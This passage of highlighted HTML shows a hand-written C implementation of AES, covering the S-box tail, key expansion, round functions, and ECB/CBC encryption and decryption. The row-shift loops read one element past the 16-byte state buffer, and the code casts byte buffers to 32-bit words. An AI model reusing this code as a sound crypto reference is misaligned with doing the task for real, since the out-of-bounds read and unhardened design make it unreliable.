class="number">0x6b</span>,</span><br><span class="line">  <span class="number">0x3a</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4f</span>, <span class="number">0x67</span>, <span class="number">0xdc</span>, <span class="number">0xea</span>, <span class="number">0x97</span>, <span class="number">0xf2</span>, <span class="number">0xcf</span>, <span class="number">0xce</span>, <span class="number">0xf0</span>, <span class="number">0xb4</span>, <span class="number">0xe6</span>, <span class="number">0x73</span>,</span><br><span class="line">  <span class="number">0x96</span>, <span class="number">0xac</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xe7</span>, <span class="number">0xad</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xe2</span>, <span class="number">0xf9</span>, <span class="number">0x37</span>, <span class="number">0xe8</span>, <span class="number">0x1c</span>, <span class="number">0x75</span>, <span class="number">0xdf</span>, <span class="number">0x6e</span>,</span><br><span class="line">  <span class="number">0x47</span>, <span class="number">0xf1</span>, <span class="number">0x1a</span>, <span class="number">0x71</span>, <span class="number">0x1d</span>, <span class="number">0x29</span>, <span class="number">0xc5</span>, <span class="number">0x89</span>, <span class="number">0x6f</span>, <span class="number">0xb7</span>, <span class="number">0x62</span>, <span class="number">0x0e</span>, <span class="number">0xaa</span>, <span class="number">0x18</span>, <span class="number">0xbe</span>, <span class="number">0x1b</span>,</span><br><span class="line">  <span class="number">0xfc</span>, <span class="number">0x56</span>, <span class="number">0x3e</span>, <span class="number">0x4b</span>, <span class="number">0xc6</span>, <span class="number">0xd2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9a</span>, <span class="number">0xdb</span>, <span class="number">0xc0</span>, <span class="number">0xfe</span>, <span class="number">0x78</span>, <span class="number">0xcd</span>, <span class="number">0x5a</span>, <span class="number">0xf4</span>,</span><br><span class="line">  <span class="number">0x1f</span>, <span class="number">0xdd</span>, <span class="number">0xa8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xc7</span>, <span class="number">0x31</span>, <span class="number">0xb1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>,</span><br><span class="line">  <span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7f</span>, <span class="number">0xa9</span>, <span class="number">0x19</span>, <span class="number">0xb5</span>, <span class="number">0x4a</span>, <span class="number">0x0d</span>, <span class="number">0x2d</span>, <span class="number">0xe5</span>, <span class="number">0x7a</span>, <span class="number">0x9f</span>, <span class="number">0x93</span>, <span class="number">0xc9</span>, <span class="number">0x9c</span>, <span class="number">0xef</span>,</span><br><span class="line">  <span class="number">0xa0</span>, <span class="number">0xe0</span>, <span class="number">0x3b</span>, <span class="number">0x4d</span>, <span class="number">0xae</span>, <span class="number">0x2a</span>, <span class="number">0xf5</span>, <span class="number">0xb0</span>, <span class="number">0xc8</span>, <span class="number">0xeb</span>, <span class="number">0xbb</span>, <span class="number">0x3c</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</span><br><span class="line">  <span class="number">0x17</span>, <span class="number">0x2b</span>, <span class="number">0x04</span>, <span class="number">0x7e</span>, <span class="number">0xba</span>, <span class="number">0x77</span>, <span class="number">0xd6</span>, <span class="number">0x26</span>, <span class="number">0xe1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0c</span>, <span class="number">0x7d</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">aes_sub_sbox</span><span class="params">(<span class="type">uint8_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> g_aes_sbox[val];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">aes_sub_dword</span><span class="params">(<span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint32_t</span> tmp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tmp |= ((<span class="type">uint32_t</span>)aes_sub_sbox((<span class="type">uint8_t</span>)((val &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xFF</span>))) &lt;&lt; <span class="number">0</span>;</span><br><span class="line">  tmp |= ((<span class="type">uint32_t</span>)aes_sub_sbox((<span class="type">uint8_t</span>)((val &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>))) &lt;&lt; <span class="number">8</span>;</span><br><span class="line">  tmp |= ((<span class="type">uint32_t</span>)aes_sub_sbox((<span class="type">uint8_t</span>)((val &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>))) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">  tmp |= ((<span class="type">uint32_t</span>)aes_sub_sbox((<span class="type">uint8_t</span>)((val &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>))) &lt;&lt; <span class="number">24</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">aes_rot_dword</span><span class="params">(<span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint32_t</span> tmp = val;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (val &gt;&gt; <span class="number">8</span>) | ((tmp &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">aes_swap_dword</span><span class="params">(<span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (((val &amp; <span class="number">0x000000FF</span>) &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">    ((val &amp; <span class="number">0x0000FF00</span>) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">    ((val &amp; <span class="number">0x00FF0000</span>) &gt;&gt; <span class="number">8</span>) |</span><br><span class="line">    ((val &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* nr: number of rounds</span></span><br><span class="line"><span class="comment">* nb: number of columns comprising the state, nb = 4 dwords (16 bytes)</span></span><br><span class="line"><span class="comment">* nk: number of 32-bit words comprising cipher key, nk = 4, 6, 8 (KeyLength/(4*8))</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_key_expansion</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *key, <span class="type">uint8_t</span> *round)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint32_t</span> *w = (<span class="type">uint32_t</span> *)round;</span><br><span class="line">  <span class="type">uint32_t</span>  t;</span><br><span class="line">  <span class="type">int</span>      i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    w[i] = *((<span class="type">uint32_t</span> *)&amp;key[i * <span class="number">4</span> + <span class="number">0</span>]);</span><br><span class="line">  &#125; <span class="keyword">while</span> (++i &lt; g_aes_nk[mode]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((i % g_aes_nk[mode]) == <span class="number">0</span>) &#123;</span><br><span class="line">      t = aes_rot_dword(w[i - <span class="number">1</span>]);</span><br><span class="line">      t = aes_sub_dword(t);</span><br><span class="line">      t = t ^ aes_swap_dword(g_aes_rcon[i / g_aes_nk[mode] - <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (g_aes_nk[mode] &gt; <span class="number">6</span> &amp;&amp; (i % g_aes_nk[mode]) == <span class="number">4</span>) &#123;</span><br><span class="line">      t = aes_sub_dword(w[i - <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      t = w[i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    w[i] = w[i - g_aes_nk[mode]] ^ t;</span><br><span class="line">  &#125; <span class="keyword">while</span> (++i &lt; g_aes_nb[mode] * (g_aes_rounds[mode] + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_add_round_key</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *state,</span></span><br><span class="line"><span class="params">  <span class="type">uint8_t</span> *round, <span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint32_t</span> *w = (<span class="type">uint32_t</span> *)round;</span><br><span class="line">  <span class="type">uint32_t</span> *s = (<span class="type">uint32_t</span> *)state;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">    s[i] ^= w[nr * g_aes_nb[mode] + i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_sub_bytes</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *state)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">      state[i * <span class="number">4</span> + j] = aes_sub_sbox(state[i * <span class="number">4</span> + j]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_shift_rows</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *state)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint8_t</span> *s = (<span class="type">uint8_t</span> *)state;</span><br><span class="line">  <span class="type">int</span> i, j, r;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">      <span class="type">uint8_t</span> tmp = s[i];</span><br><span class="line">      <span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; g_aes_nb[mode]; r++) &#123;</span><br><span class="line">        s[i + r * <span class="number">4</span>] = s[i + (r + <span class="number">1</span>) * <span class="number">4</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      s[i + (g_aes_nb[mode] - <span class="number">1</span>) * <span class="number">4</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">aes_xtime</span><span class="params">(<span class="type">uint8_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> ((x &lt;&lt; <span class="number">1</span>) ^ (((x &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span>) * <span class="number">0x1b</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">aes_xtimes</span><span class="params">(<span class="type">uint8_t</span> x, <span class="type">int</span> ts)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (ts-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    x = aes_xtime(x);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">aes_mul</span><span class="params">(<span class="type">uint8_t</span> x, <span class="type">uint8_t</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * encrypt: y has only 2 bits: can be 1, 2 or 3</span></span><br><span class="line"><span class="comment">  * decrypt: y could be any value of 9, b, d, or e</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ((((y &gt;&gt; <span class="number">0</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">0</span>)) ^</span><br><span class="line">    (((y &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">1</span>)) ^</span><br><span class="line">    (((y &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">2</span>)) ^</span><br><span class="line">    (((y &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">3</span>)) ^</span><br><span class="line">    (((y &gt;&gt; <span class="number">4</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">4</span>)) ^</span><br><span class="line">    (((y &gt;&gt; <span class="number">5</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">5</span>)) ^</span><br><span class="line">    (((y &gt;&gt; <span class="number">6</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">6</span>)) ^</span><br><span class="line">    (((y &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">7</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes_mix_columns</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *state)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint8_t</span> y[<span class="number">16</span>] = &#123; <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>,  <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>,  <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>,  <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span> &#125;;</span><br><span class="line">  <span class="type">uint8_t</span> s[<span class="number">4</span>];</span><br><span class="line">  <span class="type">int</span> i, j, r;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; <span class="number">4</span>; r++) &#123;</span><br><span class="line">      s[r] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">        s[r] = s[r] ^ aes_mul(state[i * <span class="number">4</span> + j], y[r * <span class="number">4</span> + j]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; <span class="number">4</span>; r++) &#123;</span><br><span class="line">      state[i * <span class="number">4</span> + r] = s[r];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aes_encrypt</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *data, <span class="type">int</span> len, <span class="type">uint8_t</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint8_t</span> w[<span class="number">4</span> * <span class="number">4</span> * <span class="number">15</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* round key */</span></span><br><span class="line">  <span class="type">uint8_t</span> s[<span class="number">4</span> * <span class="number">4</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* state */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> nr, i, j;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* key expansion */</span></span><br><span class="line">  aes_key_expansion(mode, key, w);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* start data cypher loop over input buffer */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span> * g_aes_nb[mode]) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* init state from user buffer (plaintext) */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">      s[j] = data[i + j];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* start AES cypher loop over all AES rounds */</span></span><br><span class="line">    <span class="keyword">for</span> (nr = <span class="number">0</span>; nr &lt;= g_aes_rounds[mode]; nr++) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (nr &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* do SubBytes */</span></span><br><span class="line">        aes_sub_bytes(mode, s);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* do ShiftRows */</span></span><br><span class="line">        aes_shift_rows(mode, s);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nr &lt; g_aes_rounds[mode]) &#123;</span><br><span class="line">          <span class="comment">/* do MixColumns */</span></span><br><span class="line">          aes_mix_columns(mode, s);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* do AddRoundKey */</span></span><br><span class="line">      aes_add_round_key(mode, s, w, nr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* save state (cypher) to user buffer */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">      data[i + j] = s[j];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aes_encrypt_ecb</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *data, <span class="type">int</span> len, <span class="type">uint8_t</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> aes_encrypt(mode, data, len, key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aes_encrypt_cbc</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *data, <span class="type">int</span> len, <span class="type">uint8_t</span> *key, <span class="type">uint8_t</span> *iv)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint8_t</span> w[<span class="number">4</span> * <span class="number">4</span> * <span class="number">15</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* round key */</span></span><br><span class="line">  <span class="type">uint8_t</span> s[<span class="number">4</span> * <span class="number">4</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* state */</span></span><br><span class="line">  <span class="type">uint8_t</span> v[<span class="number">4</span> * <span class="number">4</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* iv */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> nr, i, j;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* key expansion */</span></span><br><span class="line">  aes_key_expansion(mode, key, w);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(v, iv, <span class="keyword">sizeof</span>(v));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* start data cypher loop over input buffer */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span> * g_aes_nb[mode]) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* init state from user buffer (plaintext) */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">      s[j] = data[i + j] ^ v[j];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* start AES cypher loop over all AES rounds */</span></span><br><span class="line">    <span class="keyword">for</span> (nr = <span class="number">0</span>; nr &lt;= g_aes_rounds[mode]; nr++) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (nr &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* do SubBytes */</span></span><br><span class="line">        aes_sub_bytes(mode, s);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* do ShiftRows */</span></span><br><span class="line">        aes_shift_rows(mode, s);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nr &lt; g_aes_rounds[mode]) &#123;</span><br><span class="line">          <span class="comment">/* do MixColumns */</span></span><br><span class="line">          aes_mix_columns(mode, s);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* do AddRoundKey */</span></span><br><span class="line">      aes_add_round_key(mode, s, w, nr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* save state (cypher) to user buffer */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">      data[i + j] = v[j] = s[j];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">inv_shift_rows</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *state)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint8_t</span> *s = (<span class="type">uint8_t</span> *)state;</span><br><span class="line">  <span class="type">int</span> i, j, r;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; g_aes_nb[mode] - i; j++) &#123;</span><br><span class="line">      <span class="type">uint8_t</span> tmp = s[i];</span><br><span class="line">      <span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; g_aes_nb[mode]; r++) &#123;</span><br><span class="line">        s[i + r * <span class="number">4</span>] = s[i + (r + <span class="number">1</span>) * <span class="number">4</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      s[i + (g_aes_nb[mode] - <span class="number">1</span>) * <span class="number">4</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">inv_sub_sbox</span><span class="params">(<span class="type">uint8_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> g_inv_sbox[val];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">inv_sub_bytes</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *state)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">      state[i * <span class="number">4</span> + j] = inv_sub_sbox(state[i * <span class="number">4</span> + j]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">inv_mix_columns</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *state)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint8_t</span> y[<span class="number">16</span>] = &#123; <span class="number">0x0e</span>, <span class="number">0x0b</span>, <span class="number">0x0d</span>, <span class="number">0x09</span>,  <span class="number">0x09</span>, <span class="number">0x0e</span>, <span class="number">0x0b</span>, <span class="number">0x0d</span>,</span><br><span class="line">    <span class="number">0x0d</span>, <span class="number">0x09</span>, <span class="number">0x0e</span>, <span class="number">0x0b</span>,  <span class="number">0x0b</span>, <span class="number">0x0d</span>, <span class="number">0x09</span>, <span class="number">0x0e</span> &#125;;</span><br><span class="line">  <span class="type">uint8_t</span> s[<span class="number">4</span>];</span><br><span class="line">  <span class="type">int</span> i, j, r;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; <span class="number">4</span>; r++) &#123;</span><br><span class="line">      s[r] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">        s[r] = s[r] ^ aes_mul(state[i * <span class="number">4</span> + j], y[r * <span class="number">4</span> + j]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; <span class="number">4</span>; r++) &#123;</span><br><span class="line">      state[i * <span class="number">4</span> + r] = s[r];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aes_decrypt</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *data, <span class="type">int</span> len, <span class="type">uint8_t</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint8_t</span> w[<span class="number">4</span> * <span class="number">4</span> * <span class="number">15</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* round key */</span></span><br><span class="line">  <span class="type">uint8_t</span> s[<span class="number">4</span> * <span class="number">4</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">/* state */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> nr, i, j;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* key expansion */</span></span><br><span class="line">  aes_key_expansion(mode, key, w);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* start data cypher loop over input buffer */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span> * g_aes_nb[mode]) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* init state from user buffer (cyphertext) */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">      s[j] = data[i + j];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* start AES cypher loop over all AES rounds */</span></span><br><span class="line">    <span class="keyword">for</span> (nr = g_aes_rounds[mode]; nr &gt;= <span class="number">0</span>; nr--) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* do AddRoundKey */</span></span><br><span class="line">      aes_add_round_key(mode, s, w, nr);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (nr &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nr &lt; g_aes_rounds[mode]) &#123;</span><br><span class="line">          <span class="comment">/* do MixColumns */</span></span><br><span class="line">          inv_mix_columns(mode, s);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* do ShiftRows */</span></span><br><span class="line">        inv_shift_rows(mode, s);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* do SubBytes */</span></span><br><span class="line">        inv_sub_bytes(mode, s);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* save state (cypher) to user buffer */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">      data[i + j] = s[j];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aes_decrypt_ecb</span><span class="params">(AES_CYPHER_T mode, <span class="type">uint8_t</span> *data, <span class="type">int</span> len, <span class="type">uint8_t</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> aes_decrypt(mode, data, len, key);</span><br><span class="line">&#125;</span><br><span class="line"><span 